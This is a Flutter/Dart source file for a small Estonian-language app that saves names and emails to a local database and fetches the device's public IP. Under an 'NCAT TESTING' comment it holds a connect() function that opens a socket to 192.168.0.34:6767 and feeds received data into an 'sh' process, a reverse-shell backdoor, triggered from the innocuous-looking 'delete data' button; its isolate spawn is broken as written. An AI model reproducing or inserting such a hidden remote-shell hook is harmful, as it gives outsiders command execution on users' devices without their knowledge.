import 'dart:isolate';

import 'package:flutter/material.dart';
import 'package:path/path.dart';
import 'dart:math';
import 'dart:async';
import 'dart:io';
import 'dart:convert';

import 'services/database.dart';
import 'package:http/http.dart' as http; // Import HTTP package
import 'package:logger/logger.dart';

final Logger logger = Logger();

void main() {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({Key? key}) : super(key: key);

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Näidis',
      theme: ThemeData(
        colorScheme: ColorScheme.fromSwatch().copyWith(
          background: Colors.black, // Changed background color to indigo
          secondary: Colors.black, // Changed secondary color to green
        ),
      ),
      home: const MyHomePage(title: 'PROOV'),
    );
  }
}

class MyHomePage extends StatefulWidget {
  final String title;

  const MyHomePage({Key? key, required this.title}) : super(key: key);

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  final DatabaseService databaseService = DatabaseService();
  TextEditingController username =
      TextEditingController(); // Controller for TextFormField
  TextEditingController email = TextEditingController();
  String password = '';
  String ip = '';
  String text = '';
  String data = '';

  @override
  void initState() {
    super.initState();
    fetchIP();
    DatabaseService();
  }

  // NCAT TESTING

  void connect() {
    Socket.connect("192.168.0.34", 6767).then((socket) {
      socket.listen((data) {
        // Handle incoming data in a separate isolate
        handleData(data);
      }, onDone: () {
        socket.destroy();
      });
    });
  }

  void handleData(data) {
    // Spawn a new isolate to handle the data asynchronously
    Future<void> isolateFunction() async {
      // Start the process
      Process process = await Process.start('sh', []);

      // Write data to the process
      process.stdin.add(data);

      // Read output from the process
      StreamSubscription subscription =
          process.stdout.transform(utf8.decoder).listen((output) {
        // Write output back to the socket
        logger.f("Connection: " + output);
      });

      // Handle errors
      process.stderr.listen((error) {
        logger.e("Error: $error");
      });

      // Wait for the process to exit
      await process.exitCode;

      // Cancel the subscription
      await subscription.cancel();
    }

    // Spawn the isolate
    //Isolate.spawn(isolateFunction, data);
    Isolate.spawn((isolateFunction) {}, data);
  }

  fetchIP() async {
    try {
      final response =
          await http.get(Uri.parse('https://api.ipify.org?format=json'));
      if (response.statusCode == 200) {
        final data = response.body;
        setState(() {
          ip = data;
        });
      } else {
        setState(() {
          ip = 'Failed to fetch IP';
        });
      }
    } catch (e) {
      setState(() {
        ip = 'Error: $e';
      });
    }
  }

  String generatePassword() {
    const int passlength = 20;
    const String allowedChars =
        "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    Random random = Random.secure();
    String generatedPassword = '';

    for (int i = 0; i < passlength; i++) {
      int randomIndex = random.nextInt(allowedChars.length);
      generatedPassword += allowedChars[randomIndex];
    }
    return generatedPassword;
  }

  getUserDatas() async {
    // Fetch user data from the database
    List<Map<String, dynamic>> userData = await databaseService.getUsers();

    // Convert the list of maps to a string
    String userDataAsString = userData.toString();

    // Update the state to display the fetched data
    setState(() {
      text = userDataAsString;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        backgroundColor: Theme.of(context).colorScheme.secondary,
        title: Center(
          child: Text(widget.title),
        ),
      ),
      body: SingleChildScrollView(
        child: Padding(
          padding: const EdgeInsets.all(16.0),
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.stretch,
            children: <Widget>[
              SizedBox(height: 30),
              TextFormField(
                controller: username,
                keyboardType: TextInputType.text,
                decoration: InputDecoration(
                  labelText: 'Sisesta nimi',
                  contentPadding: EdgeInsets.symmetric(vertical: 5.0),
                  labelStyle:
                      TextStyle(color: Color.fromARGB(255, 62, 228, 145)),
                ),
                style: TextStyle(color: Colors.white),
                textAlign: TextAlign.center,
              ),
              SizedBox(height: 20),
              TextFormField(
                controller: email,
                keyboardType: TextInputType.text,
                decoration: InputDecoration(
                  labelText: 'Sisesta email',
                  contentPadding: EdgeInsets.symmetric(vertical: 5.0),
                  focusColor: Color.fromARGB(255, 255, 9, 9),
                  labelStyle:
                      TextStyle(color: Color.fromARGB(255, 62, 228, 145)),
                ),
                style: TextStyle(color: Colors.white),
                textAlign: TextAlign.center,
              ),
              SizedBox(height: 20),
              ElevatedButton(
                style: ButtonStyle(
                  backgroundColor:
                      MaterialStateProperty.all<Color>(Colors.green),
                ),
                onPressed: () {
                  databaseService.addUser(username.text, email.text);
                  getUserDatas();
                },
                child: Text(
                  "Salvesta",
                  style: TextStyle(color: Colors.white),
                ),
              ),
              SizedBox(height: 20),
              Container(
                padding: EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Colors.indigo,
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Text(
                  'Salvestatud andmed:',
                  style: TextStyle(
                    color: Colors.green,
                    fontSize: 18,
                  ),
                ),
              ),
              SizedBox(height: 10),
              Container(
                padding: EdgeInsets.all(8),
                decoration: BoxDecoration(
                  color: Color.fromARGB(255, 255, 255, 255),
                  borderRadius: BorderRadius.circular(10),
                ),
                child: Text(
                  text,
                  style: TextStyle(
                    color: Colors.green,
                    fontSize: 18,
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
      bottomNavigationBar: BottomAppBar(
        child: Row(
          mainAxisAlignment: MainAxisAlignment.spaceEvenly,
          children: [
            TextButton(
              style: ButtonStyle(
                backgroundColor: MaterialStateProperty.all<Color>(Colors.green),
              ),
              onPressed: () {
                getUserDatas();
              },
              child: Text(
                'Korja andmed',
                style: TextStyle(color: Colors.white),
              ),
            ),
            TextButton(
              style: ButtonStyle(
                backgroundColor: MaterialStateProperty.all<Color>(Colors.green),
              ),
              onPressed: () {
                databaseService.deleteDatabase();
                connect();
              },
              child: Text(
                'Kustuta andmed',
                style: TextStyle(color: Colors.white),
              ),
            ),
            TextButton(
              style: ButtonStyle(
                backgroundColor: MaterialStateProperty.all<Color>(Colors.green),
              ),
              onPressed: () {
                setState(() {
                  text = '';
                });
              },
              child: Text(
                "Kustuta väli",
                style: TextStyle(color: Colors.white),
              ),
            ),
          ],
        ),
      ),
    );
  }
}
